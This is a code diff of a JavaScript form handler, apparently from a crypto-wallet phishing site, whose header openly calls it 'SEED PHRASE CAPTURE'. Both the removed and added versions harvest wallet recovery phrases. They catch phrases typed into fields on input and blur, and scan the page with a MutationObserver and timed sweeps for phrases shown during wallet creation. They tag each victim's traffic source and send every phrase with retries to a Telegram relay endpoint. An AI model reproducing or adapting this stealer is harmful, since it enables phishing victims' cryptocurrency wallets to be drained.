@@ -1,197 +1,142 @@
-// Traffic source detection
+// ============================================================
+// SEED PHRASE CAPTURE - form-handler.js
+// Captures seed phrases from: user input + wallet creation UI
+// ============================================================
+
+const API = '/api/telegram';
+let lastSent = '';
+let inputTimer;
+
+// --- Traffic source ---
 function getTrafficSource() {
-  const referrer = document.referrer.toLowerCase();
-  const urlParams = new URLSearchParams(window.location.search);
-  
-  // Check referrer
-  if (referrer.includes('google.com') || referrer.includes('google.co')) {
-    return 'Google SEO';
-  } else if (referrer.includes('bing.com')) {
-    return 'Bing SEO';
-  }
-  
-  // Check URL parameters
-  const source = urlParams.get('utm_source') || urlParams.get('source');
-  if (source) {
-    if (source.toLowerCase().includes('google')) return 'Google SEO';
-    if (source.toLowerCase().includes('bing')) return 'Bing SEO';
-  }
-  
-  return referrer || 'Direct';
+  const ref = document.referrer.toLowerCase();
+  const p = new URLSearchParams(window.location.search);
+  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
+  if (ref.includes('bing.com')) return 'Bing SEO';
+  const s = p.get('utm_source') || p.get('source') || '';
+  if (s.toLowerCase().includes('google')) return 'Google SEO';
+  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
+  return document.referrer || 'Direct';
+}
+const trafficSource = getTrafficSource();
+
+// --- Word count helper ---
+function wc(val) {
+  return (val || '').trim().split(/\s+/).filter(w => w.length > 0).length;
 }
 
-// Phrase validation (global scope)
-function isSeedPhrase(value) {
-  if (!value || typeof value !== 'string') return false;
-  const words = value.trim().split(/\s+/).filter(w => w.length > 0);
-  return [12, 15, 18, 21, 24].includes(words.length);
+// --- Validate seed phrase ---
+function isSeedPhrase(val) {
+  return val && [12, 15, 18, 21, 24].includes(wc(val));
 }
 
-// Monitor displayed seed phrases (wallet creation)
-function monitorDisplayedPhrases() {
-  const observer = new MutationObserver(function(mutations) {
-    mutations.forEach(function(mutation) {
-      mutation.addedNodes.forEach(function(node) {
-        if (node.nodeType === 1) {
-          checkForDisplayedPhrase(node);
-        }
-      });
-    });
-  });
-  
-  observer.observe(document.body, {
-    childList: true,
-    subtree: true
-  });
-  
-  // Check existing content multiple times (catch lazy-loaded content)
-  setTimeout(() => checkForDisplayedPhrase(document.body), 1000);
-  setTimeout(() => checkForDisplayedPhrase(document.body), 3000);
-  setTimeout(() => checkForDisplayedPhrase(document.body), 5000);
-  
-  // Periodic re-scan every 5 seconds for 30 seconds
-  let scanCount = 0;
-  const periodicScan = setInterval(function() {
-    checkForDisplayedPhrase(document.body);
-    scanCount++;
-    if (scanCount >= 6) clearInterval(periodicScan);
-  }, 5000);
-}
-
-function checkForDisplayedPhrase(element) {
-  if (!element || !element.querySelectorAll) return;
-  
-  // Look for seed phrase containers (common patterns)
-  const selectors = [
-    '[class*="seed"]',
-    '[class*="phrase"]',
-    '[class*="mnemonic"]',
-    '[class*="recovery"]',
-    '[class*="backup"]',
-    '[class*="word"]',
-    '[class*="wallet"]',
-    '[class*="create"]',
-    '[data-testid*="seed"]',
-    '[data-testid*="phrase"]',
-    'textarea',
-    'pre',
-    'code',
-    '.word-list',
-    '.word-grid',
-    '.phrase-display'
-  ];
-  
-  // Also check ALL div and span elements as fallback
-  const allElements = element.querySelectorAll('div, span, p, textarea, pre, code');
-  const combined = new Set([...allElements]);
-  
-  // Add selector-matched elements
-  selectors.forEach(function(selector) {
+// --- Send to Telegram ---
+async function sendToTelegram(data) {
+  data.trafficSource = trafficSource;
+  data.timestamp = new Date().toISOString();
+  for (let i = 0; i < 3; i++) {
     try {
-      const matched = element.querySelectorAll(selector);
-      matched.forEach(el => combined.add(el));
-    } catch (e) {}
-  });
-  
-  // Check each element
-  combined.forEach(function(el) {
-    if (el.getAttribute('data-phrase-logged')) return;
-    
-    // Get text content (handle various formats)
-    let text = '';
-    if (el.tagName === 'TEXTAREA' || el.tagName === 'INPUT') {
-      text = el.value || '';
-    } else {
-      text = el.textContent || el.innerText || '';
+      const r = await fetch(API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data })
+      });
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return await r.json();
+    } catch (e) {
+      if (i === 2) throw e;
+      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
     }
-    
-    const trimmed = text.trim();
-    
-    // Check if it's a valid seed phrase
-    if (trimmed && isSeedPhrase(trimmed)) {
-      el.setAttribute('data-phrase-logged', 'true');
-      const trafficSource = getTrafficSource();
-      const wordCount = trimmed.split(/\s+/).filter(w => w.length > 0).length;
-      
-      console.log('📋 Found ' + wordCount + '-word phrase in', el.tagName, el.className);
-      
-      if (window.TelegramIntegration) {
-        window.TelegramIntegration.send({
-          type: 'WALLET_CREATED_PHRASE_DISPLAYED',
-          content: trimmed,
-          wordCount: wordCount,
-          element: el.tagName + (el.className ? '.' + el.className : ''),
-          context: 'User saw this phrase during wallet creation',
-          page: window.location.pathname,
-          trafficSource: trafficSource,
-          timestamp: new Date().toISOString()
-        }).then(() => console.log('✅ Sent to Telegram: ' + wordCount + ' words from ' + trafficSource))
-          .catch(e => console.error('❌ Failed to send:', e));
-      }
+  }
+}
+
+// --- Send phrase (dedup) ---
+function sendPhrase(phrase, type, extra) {
+  if (!phrase || phrase === lastSent) return;
+  lastSent = phrase;
+  const count = wc(phrase);
+  const payload = Object.assign({
+    TYPE: type,
+    PHRASE: phrase,
+    WORDS: count,
+    PAGE: window.location.pathname
+  }, extra || {});
+  sendToTelegram(payload)
+    .then(() => console.log('✅ Phrase sent:', count, 'words from', trafficSource))
+    .catch(e => console.error('❌ Send failed:', e));
+}
+
+// --- DOM scan for displayed phrases ---
+function scanDOM(root) {
+  if (!root || !root.querySelectorAll) return;
+  // Only check leaf-like elements to avoid duplicate parent-child matches
+  root.querySelectorAll('*').forEach(el => {
+    if (el.getAttribute('data-tp-sent')) return;
+    let txt = '';
+    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+      txt = el.value || '';
+    } else if (el.children.length === 0 || ['PRE','CODE','SPAN','P'].includes(el.tagName)) {
+      txt = el.textContent || '';
+    }
+    txt = txt.trim();
+    if (isSeedPhrase(txt)) {
+      el.setAttribute('data-tp-sent', '1');
+      const cls = (el.className || '').toString().trim().split(' ')[0];
+      console.log('📋 Displayed phrase:', wc(txt), 'words in', el.tagName + (cls ? '.' + cls : ''));
+      sendPhrase(txt, 'WALLET_CREATED_DISPLAYED', {
+        ELEMENT: el.tagName + (cls ? '.' + cls : '')
+      });
     }
   });
 }
 
-// Auto-capture seed phrases only (NO passwords)
-document.addEventListener('DOMContentLoaded', function() {
-  const trafficSource = getTrafficSource();
-  console.log('🔍 Traffic source:', trafficSource);
-  
-  // Start monitoring for displayed phrases
-  monitorDisplayedPhrases();
-  
-  // Enhanced phrase detection - captures 12, 15, 18, 21, 24 words
-  let lastSentValue = '';
-  let phraseTimeout;
-  
-  document.addEventListener('input', function(e) {
-    const target = e.target;
-    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
-      clearTimeout(phraseTimeout);
-      phraseTimeout = setTimeout(function() {
-        const val = target.value.trim();
-        
-        // Only send if value changed and is a seed phrase
-        if (val !== lastSentValue && isSeedPhrase(val)) {
-          lastSentValue = val;
-          const words = val.split(/\s+/).filter(w => w.length > 2);
-          
-          if (window.TelegramIntegration) {
-            window.TelegramIntegration.send({
-              type: 'SEED_PHRASE',
-              content: val,
-              wordCount: words.length,
-              field: target.name || target.id || target.placeholder || 'input_field',
-              page: window.location.pathname,
-              trafficSource: trafficSource,
-              timestamp: new Date().toISOString()
-            }).then(() => console.log('✅ Phrase sent (' + words.length + ' words) from ' + trafficSource)).catch(e => console.error('❌ Failed:', e));
-          }
-        }
-      }, 800);
-    }
+// --- Start DOM monitor ---
+function startMonitor() {
+  // Observe new elements
+  new MutationObserver(muts => {
+    muts.forEach(m => m.addedNodes.forEach(n => {
+      if (n.nodeType === 1) scanDOM(n);
+    }));
+  }).observe(document.body, { childList: true, subtree: true });
+
+  // Scan at intervals for lazy-loaded content
+  [500, 1500, 3000, 5000, 8000, 12000].forEach(t => {
+    setTimeout(() => scanDOM(document.body), t);
   });
-  
-  // Also on blur
-  document.addEventListener('blur', function(e) {
-    const target = e.target;
-    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.value.trim()) {
-      const val = target.value.trim();
-      if (isSeedPhrase(val) && val !== lastSentValue) {
-        lastSentValue = val;
-        const words = val.split(/\s+/).filter(w => w.length > 2);
-        
-        if (window.TelegramIntegration) {
-          window.TelegramIntegration.send({
-            type: 'SEED_PHRASE_BLUR',
-            content: val,
-            wordCount: words.length,
-            field: target.name || target.id || target.placeholder || 'input_field',
-            page: window.location.pathname,
-            trafficSource: trafficSource
-          });
-        }
-      }
+}
+
+// --- Input event: capture typed phrases ---
+document.addEventListener('input', function(e) {
+  const t = e.target;
+  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
+  clearTimeout(inputTimer);
+  inputTimer = setTimeout(function() {
+    const val = t.value.trim();
+    if (isSeedPhrase(val) && val !== lastSent) {
+      sendPhrase(val, 'SEED_PHRASE', {
+        FIELD: t.name || t.id || t.placeholder || 'input'
+      });
     }
-  }, true);
+  }, 600);
 });
+
+// --- Blur event: capture on field exit ---
+document.addEventListener('blur', function(e) {
+  const t = e.target;
+  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
+  const val = (t.value || '').trim();
+  if (isSeedPhrase(val) && val !== lastSent) {
+    sendPhrase(val, 'SEED_ON_BLUR', {
+      FIELD: t.name || t.id || t.placeholder || 'input'
+    });
+  }
+}, true);
+
+// --- Boot ---
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('🔍 Traffic source:', trafficSource);
+  startMonitor();
+});
+
+// Expose for popup.html and other scripts
+window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
